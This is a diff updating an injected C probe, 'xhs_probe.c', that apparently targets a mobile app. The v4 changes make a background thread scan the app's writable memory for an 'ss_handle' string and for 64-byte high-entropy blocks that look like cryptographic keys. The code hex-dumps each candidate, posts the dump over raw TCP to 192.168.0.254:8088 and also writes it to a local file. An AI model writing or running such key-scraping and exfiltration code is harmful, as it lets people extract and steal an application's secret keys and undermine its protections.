@@ -1,5 +1,6 @@
-// xhs_probe.c v3 —— 零系统头文件
-// 后台线程扫描（不阻塞主线程）+ 限时 20s + 只扫可写区 + vm_read_overwrite 安全读
+// xhs_probe.c v4 —— 后台线程；不猜名字，按结构找 {u32 mode, key[64]}
+// 判定：窗口 68 字节，前 4 字节是小整数(0..15)，后 64 字节高熵(不同字节值>=32)
+// 另外仍然搜 "ss_handle" 字面量
 
 typedef unsigned int        u32;
 typedef unsigned long long  u64;
@@ -61,31 +62,25 @@ struct sockaddr_in_x {
 
 #define AF_INET_X     2
 #define SOCK_STREAM_X 1
-#define OUT_HOST      0xFE00A8C0u   /* 192.168.0.254 */
-#define OUT_PORT_H    0x981Fu       /* 8088 */
-#define MAX_HITS      6
-#define CTX           0x800
+#define OUT_HOST      0xFE00A8C0u
+#define OUT_PORT_H    0x981Fu
 #define CHUNK         (256u * 1024)
-#define MAX_SCAN      (768ull * 1024 * 1024)   /* 最多扫 768MB */
 #define MAX_REGION    (256ull * 1024 * 1024)
+#define MAX_SCAN      (1024ull * 1024 * 1024)
+#define MAX_CAND      24
+#define CAND_CTX      192
 
 static char *g_buf;
 static usize g_len, g_cap;
-static int   g_hits, g_chunks;
+static int   g_cand, g_chunks;
 static u64   g_scanned;
 
-static void buf_init(void) {
-    g_cap = 1u << 20;
-    g_buf = (char *)malloc(g_cap);
-    g_len = 0;
-    if (g_buf) g_buf[0] = 0;
-}
+static void buf_init(void) { g_cap = 1u << 20; g_buf = (char *)malloc(g_cap); g_len = 0;
+                             if (g_buf) g_buf[0] = 0; }
 static void buf_add(const char *s, usize n) {
     if (!g_buf) return;
     if (g_len + n + 1 >= g_cap) return;
-    memcpy(g_buf + g_len, s, n);
-    g_len += n;
-    g_buf[g_len] = 0;
+    memcpy(g_buf + g_len, s, n); g_len += n; g_buf[g_len] = 0;
 }
 static void buf_str(const char *s) { buf_add(s, strlen(s)); }
 static void buf_hex(const unsigned char *p, usize n) {
@@ -107,12 +102,7 @@ static void buf_hex(const unsigned char *p, usize n) {
 }
 
 static void tcp_send(const char *tag, const char *body, usize n) {
-    int fd;
-    struct sockaddr_in_x a;
-    char head[256];
-    int hl;
-    usize off = 0;
-
+    int fd; struct sockaddr_in_x a; char head[256]; int hl; usize off = 0;
     fd = socket(AF_INET_X, SOCK_STREAM_X, 0);
     if (fd < 0) return;
     memset(&a, 0, sizeof(a));
@@ -120,7 +110,6 @@ static void tcp_send(const char *tag, const char *body, usize n) {
     a.sin_family = AF_INET_X;
     a.sin_port = OUT_PORT_H;
     a.sin_addr = OUT_HOST;
-
     if (connect(fd, (const void *)&a, (unsigned int)sizeof(a)) == 0) {
         hl = snprintf(head, sizeof(head),
                       "POST /%s HTTP/1.1\r\nHost: x\r\nContent-Length: %lu\r\n"
@@ -137,20 +126,28 @@ static void tcp_send(const char *tag, const char *body, usize n) {
 
 static void write_file(const char *text) {
     const char *home = getenv("HOME");
-    char path[512];
-    int fd;
-    usize n, off = 0;
+    char path[512]; int fd; usize n, off = 0;
     if (!home) return;
     snprintf(path, sizeof(path), "%s/tmp/xhs_dump.txt", home);
     fd = open(path, 1 | 0x200 | 0x400, 0644);
     if (fd < 0) return;
     n = strlen(text);
-    while (off < n) {
-        long w = write(fd, text + off, n - off);
-        if (w <= 0) break;
-        off += (usize)w;
-    }
+    while (off < n) { long w = write(fd, text + off, n - off); if (w <= 0) break; off += (usize)w; }
     close(fd);
+}
+
+/* hash 相近的字节数 -> 判断是否随机 */
+static int entropy_ok(const unsigned char *p, int n) {
+    int seen[256];
+    int i, dist = 0, runs = 0, maxrun = 0;
+    memset(seen, 0, sizeof(seen));
+    for (i = 0; i < n; i++) {
+        if (!seen[p[i]]) { seen[p[i]] = 1; dist++; }
+        if (p[i] >= 0x20 && p[i] < 0x7f) { runs++; if (runs > maxrun) maxrun = runs; }
+        else runs = 0;
+    }
+    if (maxrun > 12) return 0;     /* 长 ASCII 串 -> 不像密钥 */
+    return dist >= 30;
 }
 
 static void *worker(void *arg) {
@@ -162,14 +159,13 @@ static void *worker(void *arg) {
     int rounds = 0;
 
     (void)arg;
-    sleep(4);   /* 等 App 启动完 */
-
+    sleep(4);
     buf_init();
     if (!g_buf) return 0;
     scratch = (char *)malloc(CHUNK);
     if (!scratch) return 0;
 
-    buf_str("=== xhs_probe v3 ===\n");
+    buf_str("=== xhs_probe v4 (struct-heuristic) ===\n");
     {
         const char *home = getenv("HOME");
         snprintf(tmp, sizeof(tmp), "home=%s\npid=%d\n", home ? home : "(null)", getpid());
@@ -192,11 +188,9 @@ static void *worker(void *arg) {
         if (kr != KERN_SUCCESS) break;
         if (size == 0) break;
 
-        /* 只扫「可写」区域：SDK 的配置表一定在堆/数据段 */
         if ((info.protection & VM_PROT_WRITE) && size < MAX_REGION) {
-            for (off = 0; off < size && g_hits < MAX_HITS; off += CHUNK) {
-                mach_vm_size_t want = size - off;
-                mach_vm_size_t got = 0;
+            for (off = 0; off < size && g_cand < MAX_CAND; off += CHUNK) {
+                mach_vm_size_t want = size - off, got = 0;
                 usize i;
                 if (want > CHUNK) want = CHUNK;
                 kr = vm_read_overwrite(mach_task_self_, addr + off, want,
@@ -204,27 +198,36 @@ static void *worker(void *arg) {
                 if (kr != KERN_SUCCESS || got == 0) continue;
                 g_chunks++;
                 g_scanned += got;
-                for (i = 0; i + nlen < (usize)got; i++) {
+
+                for (i = 0; i + 68 < (usize)got && g_cand < MAX_CAND; i += 4) {
+                    u32 mode;
+                    memcpy(&mode, scratch + i, 4);
+                    /* 1) 字面量 ss_handle */
                     if (scratch[i] == 's') {
                         usize k = 0;
                         while (k < nlen && (unsigned char)scratch[i + k] == (unsigned char)needle[k]) k++;
                         if (k == nlen) {
-                            g_hits++;
-                            snprintf(tmp, sizeof(tmp),
-                                     "\n=== hit %d @ 0x%llx (region 0x%llx +0x%llx) ===\n",
-                                     g_hits,
-                                     (unsigned long long)(addr + off + i),
-                                     (unsigned long long)addr,
-                                     (unsigned long long)(off + i));
+                            g_cand++;
+                            snprintf(tmp, sizeof(tmp), "\n=== SS_HANDLE @ 0x%llx ===\n",
+                                     (unsigned long long)(addr + off + i));
                             buf_str(tmp);
-                            {
-                                usize s0 = (i > CTX) ? (usize)(i - CTX) : 0;
-                                usize e0 = (usize)(i + nlen + CTX);
-                                if (e0 > (usize)got) e0 = (usize)got;
-                                buf_hex((const unsigned char *)(scratch + s0), e0 - s0);
-                            }
-                            if (g_hits >= MAX_HITS) break;
+                            buf_hex((const unsigned char *)(scratch + i), 96);
+                            if (g_cand >= MAX_CAND) break;
+                            continue;
                         }
+                    }
+                    /* 2) {u32 mode<=15, 64B 高熵} */
+                    if (mode <= 15 && entropy_ok((const unsigned char *)(scratch + i + 4), 64)) {
+                        usize s0 = (i > CAND_CTX) ? (usize)(i - CAND_CTX) : 0;
+                        usize e0 = i + 68 + CAND_CTX;
+                        g_cand++;
+                        snprintf(tmp, sizeof(tmp),
+                                 "\n=== CAND %d mode=%u @ 0x%llx (region 0x%llx +0x%llx) ===\n",
+                                 g_cand, mode, (unsigned long long)(addr + off + i),
+                                 (unsigned long long)addr, (unsigned long long)(off + i));
+                        buf_str(tmp);
+                        if (e0 > (usize)got) e0 = (usize)got;
+                        buf_hex((const unsigned char *)(scratch + s0), e0 - s0);
                     }
                 }
                 if (g_len > g_cap - 8192) break;
@@ -236,11 +239,11 @@ static void *worker(void *arg) {
         if (g_len > g_cap - 8192) break;
     }
 
-    snprintf(tmp, sizeof(tmp), "\n=== done hits=%d chunks=%d scanned=%lluMB ===\n",
-             g_hits, g_chunks, (unsigned long long)(g_scanned >> 20));
+    snprintf(tmp, sizeof(tmp), "\n=== done cands=%d chunks=%d scanned=%lluMB ===\n",
+             g_cand, g_chunks, (unsigned long long)(g_scanned >> 20));
     buf_str(tmp);
 
-    tcp_send("PROBE", g_buf, g_len);
+    tcp_send("PROBE2", g_buf, g_len);
     write_file(g_buf);
     free(scratch);
     return 0;
